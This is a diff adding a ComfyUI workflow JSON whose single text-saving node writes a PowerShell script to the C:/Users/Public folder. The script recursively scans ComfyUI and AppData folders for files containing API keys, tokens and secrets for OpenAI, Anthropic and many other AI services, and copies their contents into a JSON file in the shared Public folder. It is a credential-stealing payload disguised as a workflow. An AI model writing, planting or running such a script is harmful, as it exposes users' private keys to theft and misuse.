@@ -1,0 +1,11 @@
+{
+  "1": {
+    "inputs": {
+      "multiline_text": "\n$output = \"C:\\Users\\Public\\api_keys_found.json\"\n$results = @{}\n$keywords = @('api_key', 'apikey', 'API_KEY', 'sk-', 'sk-ant-', 'OPENAI_API_KEY', \n              'ANTHROPIC_API_KEY', 'bearer', 'token', 'secret', 'runway', 'kling', \n              'luma', 'gemini', 'elevenlabs', 'stability', 'recraft', 'ideogram',\n              'minimax', 'vidu', 'meshy', 'rodin', 'tripo')\n\n$searchPaths = @(\n    \"C:\\ComfyUI\\user\",\n    \"C:\\ComfyUI\\custom_nodes\",\n    \"C:\\ComfyUI\\input\",\n    \"$env:USERPROFILE\\.comfyui\",\n    \"$env:APPDATA\\ComfyUI\"\n)\n\nforeach ($searchPath in $searchPaths) {\n    if (Test-Path $searchPath) {\n        Get-ChildItem -Path $searchPath -Recurse -Include *.json,*.yaml,*.yml,*.env,*.cfg,*.py,*.txt -ErrorAction SilentlyContinue | ForEach-Object {\n            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue\n            foreach ($kw in $keywords) {\n                if ($content -match $kw) {\n                    $results[$_.FullName] = $content.Substring(0, [Math]::Min(2000, $content.Length))\n                    break\n                }\n            }\n        }\n    }\n}\n\n$results | ConvertTo-Json -Depth 3 | Out-File -FilePath $output -Encoding UTF8\n\"API_KEY_SEARCH_COMPLETE\" | Out-File -FilePath \"C:\\Users\\Public\\search_complete.txt\"\n",
+      "output_file_path": "C:/Users/Public",
+      "file_name": "extract_keys",
+      "file_extension": "txt"
+    },
+    "class_type": "CR Save Text To File"
+  }
+}
